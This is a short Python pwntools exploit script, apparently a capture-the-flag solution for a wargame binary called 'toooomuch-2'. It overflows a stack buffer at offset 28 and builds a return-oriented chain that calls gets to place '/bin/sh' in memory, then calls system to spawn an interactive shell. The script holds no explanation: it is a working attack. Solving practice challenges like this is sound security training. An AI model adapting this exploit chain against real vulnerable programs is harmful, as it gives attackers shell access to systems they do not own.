#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x0804889b'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

shellcode="/bin/sh\0"

elf = ELF('./toooomuch-2')
exec_system=elf.plt['system']
print "%x" % exec_system
gets_addr = elf.symbols['gets']
print "%x" % gets_addr
#bss_addr = elf.bss()
bss_addr = 0x8049ca0
print "%x" % bss_addr
offset = 28

io = process('./toooomuch-2')

#io = remote('hackme.inndy.tw', 7702)
pop_ret=0x0804889b  #pop_ret
system_addr= 0x08048649

payload = 'A' * offset
payload += p32(gets_addr)
payload +=p32(pop_ret)
payload += p32(bss_addr)

payload += p32(system_addr)
payload += p32(bss_addr)
#payload += p32(0)

debug()
io.sendline(payload)
io.sendline(shellcode)

io.interactive()

io.close()
